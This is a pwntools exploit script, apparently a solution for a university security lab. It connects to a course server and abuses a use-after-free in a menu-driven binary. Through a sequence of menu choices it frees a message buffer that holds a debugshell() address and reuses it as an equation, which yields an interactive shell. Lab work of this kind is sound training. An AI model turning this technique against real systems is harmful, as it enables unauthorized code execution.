''' Script Module Importing '''
from pwn import *

TARGET_ADDR = 0x401371

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7062)      # Test Script Against Server
# p = process("./6-2_lab.bin")              # Test Script Locally
# p = gdb.debug("./6-2_lab.bin")            # Debug with GDB



""" ' ' ' ' ' ' ' ' ' ' ' """
""" input target address  """
""" ' ' ' ' ' ' ' ' ' ' ' """
'''
============ Menu ============
 Math...
  1: Create an equation
  2: Add numbers to equation
  3: Choose math operation
  4: Solve equation
 Messages...
  5: Draft new message
  6: View message
  7: Delete message
==============================

Choice:
'''
prog_menu = p.readuntil(b'=\n\n')                       # Read in Options Menu
prog_prompt = p.readuntil(b'Choice: ')                    
print("\n", prog_menu.decode('utf-8'))          # Display Options Menu

p.sendline(b"5") 
print(f"[*] Selecting Option (5): Draft New Message\n")       # Display Exploit Progress

prog_prompt = p.readuntil(b'text: ')                    # Read in Options Menu

payload = b"A"*8 + p32(TARGET_ADDR)                     # Payload Format: buffer + debugshell() address
p.sendline(payload) 
print(f"[*] Sending Payload: Buffer Fill + {hex(TARGET_ADDR)}\n")       # Display Exploit Progress


""" Remove Address/ free memory"""

prog_prompt = p.readuntil(b'Choice: ')                    # Read in Options Menu

p.sendline(b"7") 
print(f"[*] Selecting Option (7): Delete Message\n")       # Display Exploit Progress

""" ' ' ' ' ' ' ' """
""" enter equation"""
""" ' ' ' ' ' ' ' """

"""(1) Create an equation"""
prog_prompt = p.readuntil(b'Choice: ')                    # Read in Options Menu

p.sendline(b"1") 
print(f"[*] Selecting Option (1): Create an Equation\n")       # Display Exploit Progress


"""(4) Solve equation"""
prog_prompt = p.readuntil(b'Choice: ')                    # Read in Options Menu

p.sendline(b"4") 
print(f"[*] Selecting Option (4): Solve Equation\n")       # Display Exploit Progress

 
# Start Interactive Session
p.interactive()
